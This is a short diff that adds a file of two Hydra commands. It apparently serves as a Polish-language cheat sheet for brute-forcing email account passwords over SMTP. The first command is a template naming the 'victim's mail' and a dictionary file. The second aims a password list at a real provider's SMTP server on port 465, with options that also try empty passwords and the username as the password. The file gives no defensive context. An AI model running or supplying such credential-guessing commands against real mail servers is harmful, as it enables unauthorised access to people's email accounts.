@@ -1,0 +1,5 @@
+hydra -l MAIL_OFIARY
+ -P slownik.TXT -S -e ns -V -s PORT_SERWERA_SMTP adres_smtp_serwera smtp
+hydra -l przyklad1@gmail.pl
+ -P hasla.txt -S -e ns -V -s 465 smtp.wp.pl smtp
+ 
